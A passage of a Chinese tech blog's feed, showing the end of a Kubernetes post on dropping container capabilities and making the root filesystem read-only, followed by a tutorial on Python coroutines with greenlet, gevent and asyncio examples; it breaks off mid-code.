tmp</span><br></pre></td></tr></table></figure><p>为了阻止容器的这种行为，可以在容器的<code>securityContext.capabilities</code>里drop一项名为<code>CHOWN</code>的功能</p><p>首先创建一个名为<code>pod-drop-chown-capability</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-drop-chown-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">drop:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">CHOWN</span></span><br></pre></td></tr></table></figure><p>禁用<code>CHOWN</code>内核功能后，则不允许在这个pod中修改文件所有者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-drop-chown-capability -- chown guest /tmp</span><br><span class="line">chown: /tmp: Operation not permitted</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><h5 id="阻止对容器根文件系统的写入"><a href="#阻止对容器根文件系统的写入" class="headerlink" title="阻止对容器根文件系统的写入"></a>阻止对容器根文件系统的写入</h5><p>因为安全原因，可以需要组织容器中的进程对容器的根文件系统进行写入，仅允许他们写入挂载的存储卷。我们可以通过将容器的<code>securityContext.readOnlyRootFilesystem</code>设置为true来实现。</p><p>创建一个名为<code>pod-with-readonly-filesystem</code>的YAML文件，内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: pod-with-readonly-filesystem</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: main</span><br><span class="line">    image: alpine</span><br><span class="line">    command: ["/bin/sleep","999999"]</span><br><span class="line">    securityContext:</span><br><span class="line">      readOnlyRootFilesystem: true</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: my-volume</span><br><span class="line">      mountPath: /volume</span><br><span class="line">      readOnly: false</span><br><span class="line">  volumes:</span><br><span class="line">  - name: my-volume</span><br><span class="line">    emptyDir:</span><br></pre></td></tr></table></figure><p>这个pod中的容器虽然以root用户运行，拥有<code>/</code>目录的写权限，但在该目录下写入一个文件会失败，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /new-file</span><br><span class="line">touch: /new-file: Read-only file system</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><p>但是对于挂载的卷的写入时允许的，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /volume/new-file</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- ls -la /volume/new-file</span><br><span class="line">-rw-r--r--    1 root     root             0 Oct 26 06:59 /volume/new-file</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;机制说明&quot;&gt;&lt;a href=&quot;#机制说明&quot; class=&quot;headerlink&quot; title=&quot;机制说明&quot;&gt;&lt;/a&gt;机制说明&lt;/h4&gt;&lt;p&gt;Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是一个很重要的任务，&lt;code&gt;API Server&lt;/c
      
    
    </summary>
    
    
      <category term="虚拟化" scheme="elssm.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python协程</title>
    <link href="elssm.github.io/2021/10/24/Python%E5%8D%8F%E7%A8%8B/"/>
    <id>elssm.github.io/2021/10/24/Python协程/</id>
    <published>2021-10-24T03:56:55.000Z</published>
    <updated>2021-10-24T06:49:20.365Z</updated>
    
    <content type="html"><![CDATA[<h4 id="协程概念"><a href="#协程概念" class="headerlink" title="协程概念"></a>协程概念</h4><p>协程是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。与线程相比，协程更轻量。一个Python线程大概占用8M内存，而一个协程只占用1KB不到内存。协程更适用于IO密集型的应用。</p><h4 id="greenlet模块"><a href="#greenlet模块" class="headerlink" title="greenlet模块"></a>greenlet模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    g2.switch()</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    g1.switch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = greenlet(eat)</span><br><span class="line">g2 = greenlet(sleep)</span><br><span class="line">g1.switch()</span><br></pre></td></tr></table></figure><p>在上面的代码中，创建了两个协程对象，分别是<code>g1</code>和<code>g2</code>，分别对应的是<code>eat()函数</code>和<code>sleep()</code>函数。通过使用<code>greenlet</code>的<code>switch</code>方法可以切换协程。这里我们先调用<code>g1</code>的<code>switch方法</code>，此时<code>eat()</code>函数被执行，并打印出<code>start eating</code>。接下来是<code>g2</code>的<code>switch方法</code>被调用，此时执行<code>sleep()</code>函数，依次打印<code>start sleeping</code>和<code>finished sleeping</code>，之后又调用了<code>g1</code>的<code>switch方法</code>，回到<code>eat()函数中</code>，打印出<code>finished eating</code>。程序执行结束。这个时候我们就完成了两个协程之间的切换。代码的输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h4 id="gevent模块"><a href="#gevent模块" class="headerlink" title="gevent模块"></a>gevent模块</h4><p>gevent是第三方库，通过greenlet实现协程。然而当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。</p><h5 id="创建协程任务"><a href="#创建协程任务" class="headerlink" title="创建协程任务"></a>创建协程任务</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># 创造一个协程任务</span></span><br><span class="line">gevent.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>在<code>gevent</code>模块中，通过<code>gevent.spawn</code>就可以创建一个协程任务。如果需要交替之行的话，需要使用<code>gevent.sleep</code>交出控制权。这个时候，就会转去执行<code>eat</code>函数。</p><h5 id="阻塞等待协程完成"><a href="#阻塞等待协程完成" class="headerlink" title="阻塞等待协程完成"></a>阻塞等待协程完成</h5><p>使用<code>join</code>方法，可以阻塞等待一个协程的结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g1.join()</span><br></pre></td></tr></table></figure><h5 id="阻塞等待多个协程"><a href="#阻塞等待多个协程" class="headerlink" title="阻塞等待多个协程"></a>阻塞等待多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br></pre></td></tr></table></figure><p>这里需要注意在多个协程中，不能使用<code>time.sleep</code>，这样将会导致协程是同步执行的。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br></pre></td></tr></table></figure><p>因此需要使用<code>gevent.sleep</code>，这样才能引起协程之间的切换。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><p>除此之外，对于多个协程的阻塞，我们也可以不用对于每一个协程采用<code>join</code>方法， 在<code>gevent</code>中提供了<code>joinall</code>方法，在该方法中，只需要传一个协程的列表即可，因此对于上面代码最后两行，我们可以使用下面代码替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gevent.joinall([g1,g2])</span><br></pre></td></tr></table></figure><h5 id="gevent中的monkey模块"><a href="#gevent中的monkey模块" class="headerlink" title="gevent中的monkey模块"></a>gevent中的monkey模块</h5><p>monkey模块可以使我们在不修改原来使用的python标准库函数的程序的情况下，将程序转换成可以使用gevent框架的异步程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)</span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">gevent.joinall([g1, g2])</span><br></pre></td></tr></table></figure><p>我们只需要从<code>gevent</code>中导入<code>monkey</code>。并加上<code>monkey.patch_all()</code>。这样对于代码中的耗时操作，就会转换为<code>gevent</code>中实现的模块。</p><h5 id="同时起多个协程"><a href="#同时起多个协程" class="headerlink" title="同时起多个协程"></a>同时起多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g_l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    g = gevent.spawn(eat)</span><br><span class="line">    g_l.append(g)</span><br><span class="line">gevent.joinall(g_l)</span><br></pre></td></tr></table></figure><p>这里我们使用for循环起10个协程，并将起的每一个协程存入列表中进行阻塞等待。得到的输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h5 id="获取协程返回值"><a href="#获取协程返回值" class="headerlink" title="获取协程返回值"></a>获取协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">456</span></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># 创造一个协程任务</span></span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line"></span><br><span class="line">gevent.joinall([g1, g2])</span><br><span class="line">print(g1.value)</span><br><span class="line">print(g2.value)</span><br></pre></td></tr></table></figure><p>通过<code>g.value</code>可以拿到每一个协程的返回值。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h5 id="gevent实现socket并发"><a href="#gevent实现socket并发" class="headerlink" title="gevent实现socket并发"></a>gevent实现socket并发</h5><p>server端实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chat</span><span class="params">(conn)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = conn.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        conn.send(msg.upper().encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">sk.listen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    gevent.spawn(chat, conn)</span><br></pre></td></tr></table></figure><p>client端实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(i)</span>:</span></span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9000</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sk.send(<span class="string">'elssm'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        print(i*<span class="string">'*'</span>,sk.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    Thread(target=client,args=(i,)).start()</span><br></pre></td></tr></table></figure><p>这里客户端起500个线程去和服务端进行连接，在服务端接收之后，使用<code>gevent</code>模块，将连接请求通过协程进行处理。</p><h4 id="asyncio模块"><a href="#asyncio模块" class="headerlink" title="asyncio模块"></a>asyncio模块</h4><p>asyncio 是用来编写 <strong>并发</strong> 代码的库，使用 <strong>async/await</strong> 语法。需要注意的是asyncio模块是在python3.x中引入的，在python2.x中并不支持</p><h5 id="起一个协程"><a href="#起一个协程" class="headerlink" title="起一个协程"></a>起一个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(func())</span><br></pre></td></tr></table></figure><p>首先使用<code>get_event_loop</code>方法创建一个事件循环，之后使用<code>run_until_complete</code>方法将协程注册到事件循环，在asyncio模块中使用async关键字定义一个协程。对于一些耗时的操作，例如网络请求，文件读取等。我们使用asyncio.sleep函数来模拟IO操作。协程的目的也是让这些IO操作异步化。在 sleep的时候，使用await让出控制权。即当遇到阻塞调用的函数的时候，使用await方法将协程的控制权让出，以便loop调用其他的协程。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="启动多个协程"><a href="#启动多个协程" class="headerlink" title="启动多个协程"></a>启动多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">wait_obj = asyncio.wait([func(), func(), func()])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br></pre></td></tr></table></figure><p>这里我们还是使用<code>get_event_loop</code>方法先创建一个事件循环，接着我们使用<code>asyncio.wait</code>函数将多个协程保存在列表中，每当有任务阻塞的时候就await，然后其他协程继续工作。创建多个协程的列表，然后将这些协程注册到事件循环中。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br></pre></td></tr></table></figure><h5 id="获取多个协程返回值"><a href="#获取多个协程返回值" class="headerlink" title="获取多个协程返回值"></a>获取多个协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">t1 = loop.create_task(func())</span><br><span class="line">t2 = loop.create_task(func())</span><br><span class="line">tasks = [t1,t2]</span><br><span class="line">wait_obj = asyncio.wait([t1,t2])</span><br><span class="line">loop.run_until_complete(wait_obj)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tasks:</span><br><span class="line">    print(i.result())</span><br></pre></td></tr></table></figure><p>在asyncio模块中，可以使用<code>loop</code>自带的<code>create_task</code>。通过<code>result()</code>方法获取到返回值。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">end ...</span><br><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h5 id="按顺序获取协程返回值"><a href="#按顺序获取协程返回值" class="headerlink" title="按顺序获取协程返回值"></a>按顺序获取协程返回值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    